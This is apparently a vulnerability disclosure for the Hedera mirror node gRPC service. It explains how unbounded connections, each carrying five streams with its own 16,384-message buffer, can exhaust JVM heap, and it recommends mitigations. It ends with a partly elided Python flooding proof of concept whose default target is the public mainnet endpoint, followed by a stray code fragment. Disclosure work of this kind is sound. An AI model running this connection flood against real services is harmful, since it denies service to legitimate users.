### Title
Unbounded Concurrent gRPC Subscriber Connections Enable Per-Subscriber Buffer Heap Exhaustion (DoS)

### Summary
`SharedTopicListener.listen()` allocates a dedicated `onBackpressureBuffer` of up to 16,384 `TopicMessage` objects for every subscriber. The only connection-level guard (`maxConcurrentCallsPerConnection = 5`) is scoped per TCP connection, not globally, and no limit exists on the number of TCP connections or total subscribers. An unauthenticated attacker can open an unbounded number of connections, each carrying 5 streams, causing aggregate buffer allocations to exhaust JVM heap and crash the service.

### Finding Description

**Code path and root cause:**

`SharedTopicListener.listen()` is the entry point for every subscriber:

```java
// SharedTopicListener.java lines 21-25
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    return getSharedListener(filter)
            .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
            .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
            .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
}
```

Each call to `listen()` chains a **new, independent** `onBackpressureBuffer` with `maxBufferSize = 16384` (default from `ListenerProperties`). This buffer is not shared — it is per-subscriber.

`RedisTopicListener.subscribe()` correctly shares the upstream Redis subscription via `.share()`:

```java
// RedisTopicListener.java lines 68-79
private Flux<TopicMessage> subscribe(Topic topic) {
    ...
    return container
            .flatMapMany(r -> r.receive(...))
            .map(Message::getMessage)
            ...
            .share();  // shared upstream
}
```

But `.share()` only deduplicates the Redis channel subscription. Every downstream subscriber still receives its own `onBackpressureBuffer` instance from `listen()`.

**The only configured guard** is `maxConcurrentCallsPerConnection`:

```java
// GrpcConfiguration.java line 33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

```java
// NettyProperties.java line 14
private int maxConcurrentCallsPerConnection = 5;
```

This limits streams **per TCP connection**, not globally. There is no `maxConnections`, no per-IP limit, and no global connection cap configured anywhere in `GrpcConfiguration` or `GrpcProperties`.

**The subscriber counter is metric-only and never enforced:**

```java
// TopicMessageServiceImpl.java lines 48, 89-90
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

`subscriberCount` feeds a Micrometer gauge only. No code path checks it against a maximum or rejects new subscriptions.

**Exploit flow:**

1. Attacker opens N TCP connections to port 5600 (no connection limit).
2. Each connection opens 5 concurrent `subscribeTopic` gRPC streams (maxConcurrentCallsPerConnection = 5).
3. Each stream calls `SharedTopicListener.listen()`, allocating a fresh `onBackpressureBuffer(16384)`.
4. Attacker acts as a slow/non-reading consumer so messages accumulate in each buffer.
5. Total live buffers = N × 5; total buffered objects = N × 5 × 16384 `TopicMessage` instances.
6. At sufficient N, JVM heap is exhausted → `OutOfMemoryError` → service crash.

`BufferOverflowStrategy.ERROR` terminates individual streams when their buffer fills, but does not prevent the attacker from immediately reopening new streams. The retry logic in `subscribe()` (`Retry.backoff(Long.MAX_VALUE, ...)`) on the server side further ensures the shared upstream stays alive, keeping the attack surface open.

### Impact Explanation

A successful attack crashes the gRPC mirror node service with an `OutOfMemoryError`, denying all subscribers access to HCS topic data. Because the gRPC mirror node is the sole interface for Hedera Consensus Service topic subscriptions, this constitutes a complete denial of service for that protocol layer. Recovery requires a JVM restart. The attack is repeatable immediately after restart. Given the mirror node's role in serving consensus data to applications that depend on HCS (which represents a significant portion of Hedera network activity), this qualifies as a high-severity non-network DoS.

### Likelihood Explanation

No authentication or API key is required to open a gRPC stream. The gRPC port (5600) is publicly exposed. The attacker needs only a standard gRPC client (e.g., `grpcurl`, the Hedera Java SDK, or any HTTP/2 client). Opening thousands of TCP connections is trivial from a single machine or a small botnet. The attack is fully repeatable and requires no special knowledge beyond the public gRPC service definition. The per-connection limit of 5 streams is easily bypassed by opening more connections.

### Recommendation

Apply layered mitigations:

1. **Global connection limit**: Configure `NettyServerBuilder.maxConnectionAge()` and a total connection cap (e.g., via a Netty `ChannelGroup` counter or an ingress-level connection limit).
2. **Per-topic subscriber cap**: In `RedisTopicListener.getSharedListener()` or `TopicMessageServiceImpl.subscribeTopic()`, track active subscriber count per topic and reject (with `RESOURCE_EXHAUSTED` gRPC status) subscriptions that exceed a configurable threshold.
3. **Enforce the global subscriber count**: Promote `subscriberCount` from a metric to an enforced gate — reject new subscriptions when the count exceeds a configured maximum.
4. **Rate-limit connections per source IP**: Deploy an ingress-level rate limiter (e.g., Envoy, Traefik, or a Netty `IpFilterRuleHandler`) to cap connections per client IP.
5. **Reduce `maxBufferSize`**: Lower the default from 16384 to a smaller value to reduce per-subscriber memory footprint.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw HTTP/2
import grpc
import threading
from proto import consensus_service_pb2_grpc, mirror_pb2  # Hedera proto stubs

TARGET = "mirror.mainnet.hedera.com:443"  # or self-hosted instance
TOPIC_ID = "0.0.1234"  # any valid topic
CONNECTIONS = 500       # number of TCP connections
STREAMS_PER_CONN = 5   # matches maxConcurrentCallsPerConnection default

def open_streams(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for i in range(STREAMS_PER_CONN):
        def slow_consumer(stub=stub):
            req = mirror_pb2.ConsensusTopicQuery(
                topicID=...,  # set TOPIC_ID
                consensusStartTime=...,  # epoch 0 to maximize historical load
            )
            for _ in stub.subscribeTopic(req):
                import time; time.sleep(9999)  # never read, fill buffer
        t = threading.Thread(target=slow_consumer, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

threads = [threading.Thread(target=open_streams, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 500 * 5 = 2500 concurrent onBackpressureBuffer(16384) instances
# At ~1KB/TopicMessage: 2500 * 16384 * 1KB ≈ 40 GB heap pressure → OOM
```

                .map(Message::getMessage)

                .share();
    }
